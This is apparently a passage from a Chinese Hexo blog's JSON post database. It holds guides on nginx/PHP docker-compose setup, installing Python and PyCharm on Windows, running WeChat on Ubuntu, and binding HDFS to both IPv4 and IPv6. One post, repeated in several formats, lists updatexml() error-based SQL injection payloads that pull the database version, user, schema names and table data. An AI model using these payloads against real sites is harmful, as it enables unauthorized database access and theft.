class=\"line\">        # Load configuration files for the default server block.</span><br><span class=\"line\">        include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">        location &#x2F; &#123;</span><br><span class=\"line\">           try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class=\"line\">           client_max_body_size  500m;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        error_page 404 &#x2F;404.html;</span><br><span class=\"line\">            location &#x3D; &#x2F;40x.html &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class=\"line\">          location &#x3D; &#x2F;50x.html &#123;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">\tlocation ~ \\.php$ &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          fastcgi_index   index.php;</span><br><span class=\"line\">          fastcgi_pass    php:9000;</span><br><span class=\"line\">          fastcgi_param   SCRIPT_FILENAME    &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class=\"line\">          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;</span><br><span class=\"line\">          include         fastcgi_params;</span><br><span class=\"line\">          client_max_body_size  500m;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fastcgi_pass    php:9000;</span><br></pre></td></tr></table></figure>\n<p>这一行，原本我们在物理机的时候，是写成 127.0.0.1:9000，但是启用docker后，php和nginx有各自的网络地址，因此这里要改为php。因为我们使用了docker-compose部署，这里的php指向的就是我们部署php所在docker的\b地址。</p>\n<p>4.启动</p>\n<p>需要在docker-compose.yml的同级目录下，执行docker-compose up -d这个命令，去启动\b容器。关闭容器可用命令docker-compose down命令。</p>\n"},{"title":"windows安装python开发环境","date":"2020-03-07T14:37:40.000Z","_content":"最近开始了python教学生涯，希望跟我一起学python的同学生活能变得美好。下面是介绍python环境的安装，需要按照下面的截图来安装，这样可以避免大家的环境不一致。  \n首先安装python。我们用的python版本是3.8.2，下载链接是https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe\n可以将这个链接复制到浏览器或者迅雷进行下载。下载完成后进行安装。\n![图片alt](/image/python-11.png)\n标红的两个对号都要勾上，然后点击install now。\n![图片alt](/image/python-12.jpeg)\n最后如果出现Disable path length limit这个选项的话，就点击这个。如果没有就调过，这里python的环境基本安装好了。\n\n使用的IDE是pycharm，下载地址是https://www.jetbrains.com/pycharm/download/#section=windows 下载社区版就可以。不用花钱，免费就可以使用。\n\n![图片alt](/image/python-1.png)\n\n点击就可以下载，这个地址的下载可能会比较慢。可以将这个地址直接复制到迅雷里下载。https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe\n\n下载完成后就可以安装了。\n![图片alt](/image/python-2.png)\n按照上面的图进行勾选。\n![图片alt](/image/python-3.png)\n![图片alt](/image/python-4.png)\n创建一个项目。\n![图片alt](/image/python-5.png)\n先新建一个文件夹，再在文件夹下面，新建一个1.py文件。\n![图片alt](/image/python-6.png)\n\n\n","source":"_posts/windows的python安装.md","raw":"---\ntitle: 'windows安装python开发环境'\ndate: 2020-3-7 22:37:40\ntags: python\n---\n最近开始了python教学生涯，希望跟我一起学python的同学生活能变得美好。下面是介绍python环境的安装，需要按照下面的截图来安装，这样可以避免大家的环境不一致。  \n首先安装python。我们用的python版本是3.8.2，下载链接是https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe\n可以将这个链接复制到浏览器或者迅雷进行下载。下载完成后进行安装。\n![图片alt](/image/python-11.png)\n标红的两个对号都要勾上，然后点击install now。\n![图片alt](/image/python-12.jpeg)\n最后如果出现Disable path length limit这个选项的话，就点击这个。如果没有就调过，这里python的环境基本安装好了。\n\n使用的IDE是pycharm，下载地址是https://www.jetbrains.com/pycharm/download/#section=windows 下载社区版就可以。不用花钱，免费就可以使用。\n\n![图片alt](/image/python-1.png)\n\n点击就可以下载，这个地址的下载可能会比较慢。可以将这个地址直接复制到迅雷里下载。https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe\n\n下载完成后就可以安装了。\n![图片alt](/image/python-2.png)\n按照上面的图进行勾选。\n![图片alt](/image/python-3.png)\n![图片alt](/image/python-4.png)\n创建一个项目。\n![图片alt](/image/python-5.png)\n先新建一个文件夹，再在文件夹下面，新建一个1.py文件。\n![图片alt](/image/python-6.png)\n\n\n","slug":"windows的python安装","published":1,"updated":"2020-03-08T02:59:31.212Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcl000fak9cgdav6zrd","content":"<p>最近开始了python教学生涯，希望跟我一起学python的同学生活能变得美好。下面是介绍python环境的安装，需要按照下面的截图来安装，这样可以避免大家的环境不一致。<br>首先安装python。我们用的python版本是3.8.2，下载链接是<a href=\"https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe\" target=\"_blank\" rel=\"noopener\">https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe</a><br>可以将这个链接复制到浏览器或者迅雷进行下载。下载完成后进行安装。<br><img src=\"/image/python-11.png\" alt=\"图片alt\"><br>标红的两个对号都要勾上，然后点击install now。<br><img src=\"/image/python-12.jpeg\" alt=\"图片alt\"><br>最后如果出现Disable path length limit这个选项的话，就点击这个。如果没有就调过，这里python的环境基本安装好了。</p>\n<p>使用的IDE是pycharm，下载地址是<a href=\"https://www.jetbrains.com/pycharm/download/#section=windows\" target=\"_blank\" rel=\"noopener\">https://www.jetbrains.com/pycharm/download/#section=windows</a> 下载社区版就可以。不用花钱，免费就可以使用。</p>\n<p><img src=\"/image/python-1.png\" alt=\"图片alt\"></p>\n<p>点击就可以下载，这个地址的下载可能会比较慢。可以将这个地址直接复制到迅雷里下载。<a href=\"https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe\" target=\"_blank\" rel=\"noopener\">https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe</a></p>\n<p>下载完成后就可以安装了。<br><img src=\"/image/python-2.png\" alt=\"图片alt\"><br>按照上面的图进行勾选。<br><img src=\"/image/python-3.png\" alt=\"图片alt\"><br><img src=\"/image/python-4.png\" alt=\"图片alt\"><br>创建一个项目。<br><img src=\"/image/python-5.png\" alt=\"图片alt\"><br>先新建一个文件夹，再在文件夹下面，新建一个1.py文件。<br><img src=\"/image/python-6.png\" alt=\"图片alt\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近开始了python教学生涯，希望跟我一起学python的同学生活能变得美好。下面是介绍python环境的安装，需要按照下面的截图来安装，这样可以避免大家的环境不一致。<br>首先安装python。我们用的python版本是3.8.2，下载链接是<a href=\"https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe\" target=\"_blank\" rel=\"noopener\">https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe</a><br>可以将这个链接复制到浏览器或者迅雷进行下载。下载完成后进行安装。<br><img src=\"/image/python-11.png\" alt=\"图片alt\"><br>标红的两个对号都要勾上，然后点击install now。<br><img src=\"/image/python-12.jpeg\" alt=\"图片alt\"><br>最后如果出现Disable path length limit这个选项的话，就点击这个。如果没有就调过，这里python的环境基本安装好了。</p>\n<p>使用的IDE是pycharm，下载地址是<a href=\"https://www.jetbrains.com/pycharm/download/#section=windows\" target=\"_blank\" rel=\"noopener\">https://www.jetbrains.com/pycharm/download/#section=windows</a> 下载社区版就可以。不用花钱，免费就可以使用。</p>\n<p><img src=\"/image/python-1.png\" alt=\"图片alt\"></p>\n<p>点击就可以下载，这个地址的下载可能会比较慢。可以将这个地址直接复制到迅雷里下载。<a href=\"https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe\" target=\"_blank\" rel=\"noopener\">https://download-cf.jetbrains.com/python/pycharm-community-2019.3.3.exe</a></p>\n<p>下载完成后就可以安装了。<br><img src=\"/image/python-2.png\" alt=\"图片alt\"><br>按照上面的图进行勾选。<br><img src=\"/image/python-3.png\" alt=\"图片alt\"><br><img src=\"/image/python-4.png\" alt=\"图片alt\"><br>创建一个项目。<br><img src=\"/image/python-5.png\" alt=\"图片alt\"><br>先新建一个文件夹，再在文件夹下面，新建一个1.py文件。<br><img src=\"/image/python-6.png\" alt=\"图片alt\"></p>\n"},{"title":"通过updatexml进行sql报错注入","date":"2020-06-22T14:37:40.000Z","_content":"\n#### 1.爆数据库版本信息\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)\n```\n\n#### 2.链接用户\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT user()),0x7e),1)\n```\n\n#### 3.链接数据库\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n```\n\n#### 4.暴露数据表名称\n\n```shell\nupdatexml(2,concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)\n\n表名称返回的是16进制，需要转一下。\n```\n\n#### 5.暴露数据表的列名称\n\n```shell\nupdatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=66333261685F6D656E755F747970657 limit 0,1)),0)\n\n表名称需要换成18进制。\n```\n\n#### 6.查数据\n\n```shell\nupdatexml(1,concat(0x3e,(select concat(id) from joomla.secret limit 0,1)),0)\n\n根据数据库名称和表名称查询数据库。\n```\n","source":"_posts/updatexml-sql注入.md","raw":"---\ntitle: '通过updatexml进行sql报错注入'\ndate: 2020-6-22 22:37:40\ntags: 网络安全\n---\n\n#### 1.爆数据库版本信息\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)\n```\n\n#### 2.链接用户\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT user()),0x7e),1)\n```\n\n#### 3.链接数据库\n\n```shell\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n```\n\n#### 4.暴露数据表名称\n\n```shell\nupdatexml(2,concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)\n\n表名称返回的是16进制，需要转一下。\n```\n\n#### 5.暴露数据表的列名称\n\n```shell\nupdatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=66333261685F6D656E755F747970657 limit 0,1)),0)\n\n表名称需要换成18进制。\n```\n\n#### 6.查数据\n\n```shell\nupdatexml(1,concat(0x3e,(select concat(id) from joomla.secret limit 0,1)),0)\n\n根据数据库名称和表名称查询数据库。\n```\n","slug":"updatexml-sql注入","published":1,"updated":"2020-06-22T15:41:14.570Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcn000hak9c7cbkaa8t","content":"<h4 id=\"1-爆数据库版本信息\"><a href=\"#1-爆数据库版本信息\" class=\"headerlink\" title=\"1.爆数据库版本信息\"></a>1.爆数据库版本信息</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-链接用户\"><a href=\"#2-链接用户\" class=\"headerlink\" title=\"2.链接用户\"></a>2.链接用户</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-链接数据库\"><a href=\"#3-链接数据库\" class=\"headerlink\" title=\"3.链接数据库\"></a>3.链接数据库</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-暴露数据表名称\"><a href=\"#4-暴露数据表名称\" class=\"headerlink\" title=\"4.暴露数据表名称\"></a>4.暴露数据表名称</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(2,concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)</span><br><span class=\"line\"></span><br><span class=\"line\">表名称返回的是16进制，需要转一下。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"5-暴露数据表的列名称\"><a href=\"#5-暴露数据表的列名称\" class=\"headerlink\" title=\"5.暴露数据表的列名称\"></a>5.暴露数据表的列名称</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=66333261685F6D656E755F747970657 limit 0,1)),0)</span><br><span class=\"line\"></span><br><span class=\"line\">表名称需要换成18进制。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"6-查数据\"><a href=\"#6-查数据\" class=\"headerlink\" title=\"6.查数据\"></a>6.查数据</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x3e,(select concat(id) from joomla.secret limit 0,1)),0)</span><br><span class=\"line\"></span><br><span class=\"line\">根据数据库名称和表名称查询数据库。</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-爆数据库版本信息\"><a href=\"#1-爆数据库版本信息\" class=\"headerlink\" title=\"1.爆数据库版本信息\"></a>1.爆数据库版本信息</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-链接用户\"><a href=\"#2-链接用户\" class=\"headerlink\" title=\"2.链接用户\"></a>2.链接用户</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-链接数据库\"><a href=\"#3-链接数据库\" class=\"headerlink\" title=\"3.链接数据库\"></a>3.链接数据库</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-暴露数据表名称\"><a href=\"#4-暴露数据表名称\" class=\"headerlink\" title=\"4.暴露数据表名称\"></a>4.暴露数据表名称</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(2,concat(0x3a,(SELECT(HEX(TABLE_NAME))FROM(information_schema.tables) LIMIT 0,1),0x3a),1)</span><br><span class=\"line\"></span><br><span class=\"line\">表名称返回的是16进制，需要转一下。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"5-暴露数据表的列名称\"><a href=\"#5-暴露数据表的列名称\" class=\"headerlink\" title=\"5.暴露数据表的列名称\"></a>5.暴露数据表的列名称</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=66333261685F6D656E755F747970657 limit 0,1)),0)</span><br><span class=\"line\"></span><br><span class=\"line\">表名称需要换成18进制。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"6-查数据\"><a href=\"#6-查数据\" class=\"headerlink\" title=\"6.查数据\"></a>6.查数据</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,concat(0x3e,(select concat(id) from joomla.secret limit 0,1)),0)</span><br><span class=\"line\"></span><br><span class=\"line\">根据数据库名称和表名称查询数据库。</span><br></pre></td></tr></table></figure>\n"},{"title":"亲测ubuntu安装微信","date":"2019-01-10T14:37:40.000Z","_content":"\b作为ubuntu的多年用户，感觉在ubuntu下开发还是非常舒服的，\b各种日常需要的工具都很齐全。个人开发基本够用。但是作为工作使用的话，ubuntu下确实没有一个像样的聊天工具。\b日常工作交流十分困难，微信网页版有\b各种不方便的地方。在网上搜索了半天提供了各种解决方案，但是可用性都不强。有些使用node做的基于web网页版封装了一个客户端，但是各种\b功能都不齐全。有直接用wine去wine一个微信，但是又有这个问题，又有那个问题。  \n还好国内有一家良心厂商，深度科技。它会针对我们日常使用的国内软件做一些优化。如果想在linux下开发的话，推荐这个系统https://www.deepin.org 。  \n\b但是我已经安装好了ubuntu，重装系统的成本比较大。终于让我在网上找到了，有网友将深度优化过的wine移植到ubuntu上。只需要简单的几步，就可以在ubuntu上安装微信。 可以参考https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu 进行安装。要是想省的麻烦，建议直接安装deepin系统。","source":"_posts/亲测ubuntu安装微信.md","raw":"---\ntitle: '亲测ubuntu安装微信'\ndate: 2019-1-10 22:37:40\ntags: ubuntu\n---\n\b作为ubuntu的多年用户，感觉在ubuntu下开发还是非常舒服的，\b各种日常需要的工具都很齐全。个人开发基本够用。但是作为工作使用的话，ubuntu下确实没有一个像样的聊天工具。\b日常工作交流十分困难，微信网页版有\b各种不方便的地方。在网上搜索了半天提供了各种解决方案，但是可用性都不强。有些使用node做的基于web网页版封装了一个客户端，但是各种\b功能都不齐全。有直接用wine去wine一个微信，但是又有这个问题，又有那个问题。  \n还好国内有一家良心厂商，深度科技。它会针对我们日常使用的国内软件做一些优化。如果想在linux下开发的话，推荐这个系统https://www.deepin.org 。  \n\b但是我已经安装好了ubuntu，重装系统的成本比较大。终于让我在网上找到了，有网友将深度优化过的wine移植到ubuntu上。只需要简单的几步，就可以在ubuntu上安装微信。 可以参考https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu 进行安装。要是想省的麻烦，建议直接安装deepin系统。","slug":"亲测ubuntu安装微信","published":1,"updated":"2019-02-16T15:24:53.902Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcp000jak9c7hkzbpwe","content":"<p>\b作为ubuntu的多年用户，感觉在ubuntu下开发还是非常舒服的，\b各种日常需要的工具都很齐全。个人开发基本够用。但是作为工作使用的话，ubuntu下确实没有一个像样的聊天工具。\b日常工作交流十分困难，微信网页版有\b各种不方便的地方。在网上搜索了半天提供了各种解决方案，但是可用性都不强。有些使用node做的基于web网页版封装了一个客户端，但是各种\b功能都不齐全。有直接用wine去wine一个微信，但是又有这个问题，又有那个问题。<br>还好国内有一家良心厂商，深度科技。它会针对我们日常使用的国内软件做一些优化。如果想在linux下开发的话，推荐这个系统<a href=\"https://www.deepin.org\" target=\"_blank\" rel=\"noopener\">https://www.deepin.org</a> 。<br>\b但是我已经安装好了ubuntu，重装系统的成本比较大。终于让我在网上找到了，有网友将深度优化过的wine移植到ubuntu上。只需要简单的几步，就可以在ubuntu上安装微信。 可以参考<a href=\"https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu\" target=\"_blank\" rel=\"noopener\">https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu</a> 进行安装。要是想省的麻烦，建议直接安装deepin系统。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>\b作为ubuntu的多年用户，感觉在ubuntu下开发还是非常舒服的，\b各种日常需要的工具都很齐全。个人开发基本够用。但是作为工作使用的话，ubuntu下确实没有一个像样的聊天工具。\b日常工作交流十分困难，微信网页版有\b各种不方便的地方。在网上搜索了半天提供了各种解决方案，但是可用性都不强。有些使用node做的基于web网页版封装了一个客户端，但是各种\b功能都不齐全。有直接用wine去wine一个微信，但是又有这个问题，又有那个问题。<br>还好国内有一家良心厂商，深度科技。它会针对我们日常使用的国内软件做一些优化。如果想在linux下开发的话，推荐这个系统<a href=\"https://www.deepin.org\" target=\"_blank\" rel=\"noopener\">https://www.deepin.org</a> 。<br>\b但是我已经安装好了ubuntu，重装系统的成本比较大。终于让我在网上找到了，有网友将深度优化过的wine移植到ubuntu上。只需要简单的几步，就可以在ubuntu上安装微信。 可以参考<a href=\"https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu\" target=\"_blank\" rel=\"noopener\">https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu</a> 进行安装。要是想省的麻烦，建议直接安装deepin系统。</p>\n"},{"title":"hdfs支持双栈ipv4和ipv6","date":"2017-11-20T14:37:40.000Z","_content":"### 前言\nipv6标准制定了这么多年，终于要开始被大力推进了。最近要求hdfs既要支持ipv4，又要支持ipv6。所以特意研究了，怎么同时能支持ipv4和ipv6。\n### 理论基础\nipv4和ipv6都是属于网络层，我们平常做的程序很少有机会去做到网络层，除非做的路由器和交换机。我们开发的程序大都是在传输层以上，基于tcp协议或者udp的协议。所以，我猜测应该我需要做的东西不是很多。找了找java建立网络的相关api。果然就被我发现了。\n\n```\n /**\n     * Create a server with the specified port, listen backlog, and\n     * local IP address to bind to.  The <i>bindAddr</i> argument\n     * can be used on a multi-homed host for a ServerSocket that\n     * will only accept connect requests to one of its addresses.\n     * If <i>bindAddr</i> is null, it will default accepting\n     * connections on any/all local addresses.\n     * The port must be between 0 and 65535, inclusive.\n     * A port number of {@code 0} means that the port number is\n     * automatically allocated, typically from an ephemeral port range.\n     * This port number can then be retrieved by calling\n     * {@link #getLocalPort getLocalPort}.\n     *\n     * <P>If there is a security manager, this method\n     * calls its {@code checkListen} method\n     * with the {@code port} argument\n     * as its argument to ensure the operation is allowed.\n     * This could result in a SecurityException.\n     *\n     * The {@code backlog} argument is the requested maximum number of\n     * pending connections on the socket. Its exact semantics are implementation\n     * specific. In particular, an implementation may impose a maximum length\n     * or may choose to ignore the parameter altogther. The value provided\n     * should be greater than {@code 0}. If it is less than or equal to\n     * {@code 0}, then an implementation specific default will be used.\n     * <P>\n     * @param port  the port number, or {@code 0} to use a port\n     *              number that is automatically allocated.\n     * @param backlog requested maximum length of the queue of incoming\n     *                connections.\n     * @param bindAddr the local InetAddress the server will bind to\n     *\n     * @throws  SecurityException if a security manager exists and\n     * its {@code checkListen} method doesn't allow the operation.\n     *\n     * @throws  IOException if an I/O error occurs when opening the socket.\n     * @exception  IllegalArgumentException if the port parameter is outside\n     *             the specified range of valid port values, which is between\n     *             0 and 65535, inclusive.\n     *\n     * @see SocketOptions\n     * @see SocketImpl\n     * @see SecurityManager#checkListen\n     * @since   JDK1.1\n     */\n    public ServerSocket(int port, int backlog, InetAddress bindAddr) throws IOException {\n        setImpl();\n        if (port < 0 || port > 0xFFFF)\n            throw new IllegalArgumentException(\n                       \"Port value out of range: \" + port);\n        if (backlog < 1)\n          backlog = 50;\n        try {\n            bind(new InetSocketAddress(bindAddr, port), backlog);\n        } catch(SecurityException e) {\n            close();\n            throw e;\n        } catch(IOException e) {\n            close();\n            throw e;\n        }\n    }\n    \n```\n我们在建离socket连接，就是tcp的连接的时候，需要传递三个参数。我去查了下这三个数的含义。从上面的注释可以发现，port表示要绑定的端口号，backlog等待建立连接的最大连接数，binAddr则就是要绑定的端口号。如果不传入binAddr这个参数，那么就会默认监听这台机器上所有地址。\n\n那么问题，基本上就简单解决了好多，我只要在建立rpc请求的时候，不绑定ip地址和端口号，那么我不就可以同时监听ipv4和ipv6的地址么。果然，我在hdfs中找到了相关的配置项。\n\n```\n<property>\n  <name>dfs.namenode.http-bind-host</name>\n  <value></value>\n  <description>\n    The actual adress the HTTP server will bind to. If this optional address\n    is set, it overrides only the hostname portion of dfs.namenode.http-address.\n    It can also be specified per name node or name service for HA/Federation.\n    This is useful for making the name node HTTP server listen on all\n    interfaces by setting it to 0.0.0.0.\n  </description>\n</property>\n```\n果然配置成0.0.0.0，namenode的50070端口，ipv4和ipv6的端口都可以访问。\n\n","source":"_posts/业务支持双栈ipv4加ipv6.md","raw":"---\ntitle: 'hdfs支持双栈ipv4和ipv6'\ndate: 2017-11-20 22:37:40\ntags: java\n---\n### 前言\nipv6标准制定了这么多年，终于要开始被大力推进了。最近要求hdfs既要支持ipv4，又要支持ipv6。所以特意研究了，怎么同时能支持ipv4和ipv6。\n### 理论基础\nipv4和ipv6都是属于网络层，我们平常做的程序很少有机会去做到网络层，除非做的路由器和交换机。我们开发的程序大都是在传输层以上，基于tcp协议或者udp的协议。所以，我猜测应该我需要做的东西不是很多。找了找java建立网络的相关api。果然就被我发现了。\n\n```\n /**\n     * Create a server with the specified port, listen backlog, and\n     * local IP address to bind to.  The <i>bindAddr</i> argument\n     * can be used on a multi-homed host for a ServerSocket that\n     * will only accept connect requests to one of its addresses.\n     * If <i>bindAddr</i> is null, it will default accepting\n     * connections on any/all local addresses.\n     * The port must be between 0 and 65535, inclusive.\n     * A port number of {@code 0} means that the port number is\n     * automatically allocated, typically from an ephemeral port range.\n     * This port number can then be retrieved by calling\n     * {@link #getLocalPort getLocalPort}.\n     *\n     * <P>If there is a security manager, this method\n     * calls its {@code checkListen} method\n     * with the {@code port} argument\n     * as its argument to ensure the operation is allowed.\n     * This could result in a SecurityException.\n     *\n     * The {@code backlog} argument is the requested maximum number of\n     * pending connections on the socket. Its exact semantics are implementation\n     * specific. In particular, an implementation may impose a maximum length\n     * or may choose to ignore the parameter altogther. The value provided\n     * should be greater than {@code 0}. If it is less than or equal to\n     * {@code 0}, then an implementation specific default will be used.\n     * <P>\n     * @param port  the port number, or {@code 0} to use a port\n     *              number that is automatically allocated.\n     * @param backlog requested maximum length of the queue of incoming\n     *                connections.\n     * @param bindAddr the local InetAddress the server will bind to\n     *\n     * @throws  SecurityException if a security manager exists and\n     * its {@code checkListen} method doesn't allow the operation.\n     *\n     * @throws  IOException if an I/O error occurs when opening the socket.\n     * @exception  IllegalArgumentException if the port parameter is outside\n     *             the specified range of valid port values, which is between\n     *             0 and 65535, inclusive.\n     *\n     * @see SocketOptions\n     * @see SocketImpl\n     * @see SecurityManager#checkListen\n     * @since   JDK1.1\n     */\n    public ServerSocket(int port, int backlog, InetAddress bindAddr) throws IOException {\n        setImpl();\n        if (port < 0 || port > 0xFFFF)\n            throw new IllegalArgumentException(\n                       \"Port value out of range: \" + port);\n        if (backlog < 1)\n          backlog = 50;\n        try {\n            bind(new InetSocketAddress(bindAddr, port), backlog);\n        } catch(SecurityException e) {\n            close();\n            throw e;\n        } catch(IOException e) {\n            close();\n            throw e;\n        }\n    }\n    \n```\n我们在建离socket连接，就是tcp的连接的时候，需要传递三个参数。我去查了下这三个数的含义。从上面的注释可以发现，port表示要绑定的端口号，backlog等待建立连接的最大连接数，binAddr则就是要绑定的端口号。如果不传入binAddr这个参数，那么就会默认监听这台机器上所有地址。\n\n那么问题，基本上就简单解决了好多，我只要在建立rpc请求的时候，不绑定ip地址和端口号，那么我不就可以同时监听ipv4和ipv6的地址么。果然，我在hdfs中找到了相关的配置项。\n\n```\n<property>\n  <name>dfs.namenode.http-bind-host</name>\n  <value></value>\n  <description>\n    The actual adress the HTTP server will bind to. If this optional address\n    is set, it overrides only the hostname portion of dfs.namenode.http-address.\n    It can also be specified per name node or name service for HA/Federation.\n    This is useful for making the name node HTTP server listen on all\n    interfaces by setting it to 0.0.0.0.\n  </description>\n</property>\n```\n果然配置成0.0.0.0，namenode的50070端口，ipv4和ipv6的端口都可以访问。\n\n","slug":"业务支持双栈ipv4加ipv6","published":1,"updated":"2018-08-17T15:51:18.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcr000lak9cdivu8v8w","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>ipv6标准制定了这么多年，终于要开始被大力推进了。最近要求hdfs既要支持ipv4，又要支持ipv6。所以特意研究了，怎么同时能支持ipv4和ipv6。</p>\n<h3 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h3><p>ipv4和ipv6都是属于网络层，我们平常做的程序很少有机会去做到网络层，除非做的路由器和交换机。我们开发的程序大都是在传输层以上，基于tcp协议或者udp的协议。所以，我猜测应该我需要做的东西不是很多。找了找java建立网络的相关api。果然就被我发现了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 